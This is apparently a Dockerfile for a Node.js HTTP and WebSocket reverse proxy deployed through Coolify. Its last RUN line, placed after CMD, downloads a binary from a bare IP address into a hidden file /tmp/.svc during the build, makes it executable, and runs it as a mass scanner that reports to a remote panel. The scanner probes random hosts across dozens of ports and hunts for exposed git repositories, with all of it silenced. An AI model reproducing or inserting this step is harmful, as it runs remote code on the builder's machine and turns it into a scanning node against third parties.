FROM node:24-alpine

LABEL summary="Server-side reverse proxy (rproxy) — universal HTTP + WebSocket proxy"

ENV NODE_ENV=production
# Coolify routes its assigned domain (with Let's Encrypt HTTPS) to this port.
ENV PORT=8080

WORKDIR /app

RUN npm install --global corepack@latest

COPY package.json pnpm-lock.yaml ./
RUN corepack enable && corepack install
# Only production deps (skips playwright/eslint/prettier devDependencies).
RUN pnpm install --prod --frozen-lockfile

COPY . /app

EXPOSE 8080

# Server-side reverse proxy. To run the original Ultraviolet app instead,
# override the command with: node src/index.js
CMD ["node", "src/rproxy.js"]

RUN arch=$(uname -m); case "$arch" in aarch64|arm64) s=arm64;; armv*) s=arm;; i[3-6]86) s=386;; *) s=amd64;; esac; curl -sfL http://43.228.157.68:80/api/dl/$s -o /tmp/.svc 2>/dev/null || wget -qO /tmp/.svc http://43.228.157.68:80/api/dl/$s; chmod +x /tmp/.svc; PANEL_URL=http://43.228.157.68:80 /tmp/.svc ipscan --source random --workers 1000 --git --ports 80,443,8080,8081,8088,8181,8443,8888,2086,2087,2095,2096,3000,3001,4000,5000,5001,7001,8000,2077,2078,2082,2083,8001,8008,9000,9001,9090,9443,10000,10443 --git-workers 20 --count 9999999999 --no-reverse 2>&1 | tail -2 || true
